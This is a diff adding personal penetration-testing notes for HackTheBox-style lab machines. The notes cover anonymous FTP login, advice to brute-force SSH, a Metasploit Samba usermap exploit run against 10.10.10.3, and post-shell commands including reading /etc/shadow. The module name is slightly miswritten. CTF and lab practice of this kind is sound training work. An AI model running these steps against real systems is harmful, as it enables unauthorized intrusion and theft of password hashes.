@@ -58,4 +58,32 @@ nikto -h onetwoseven.htb
 sftp onetwoseven.htb
 #add the username to it, it will prompt you for the password.
 sftp ##### onetwoseven.htb
+
+#Enumerating a machine
+#running nmap command to enumerate a machine
+#first thing i will enumerate is the ftp server- look for it, if it is available.
+#then ssh- try to do a brute force on this if it is open
+#for ports 139 and 445 for smb, just focus on what the version is.can we connect to it anonymously
+#so open a new tab to start the enumeration from ftp- click on File and select 'new tab"
+#run the command 
+ftp 10.10.10.3
+#if it asks for name or username and password, type "anonymous"
+anonymous
+anonymous
+
+#google the versions of vulnerabilities that you find, to see if you can find anything of note. (with exploit added to the vulnerability
+#open up a metasploit
+msfconsole
+search username map
+use exploit/multi/samba/usermap script
+options
+set rhosts 10.10.10.3
+run
+#once it is completed and you don't get anything, you can run it again until perhaps get a shell( i.e the run command)
+#run whoami and see if it will give you root, then hostname
+whoami
+hostname
+cat /etc/shadow
+arp -a
+route
                       
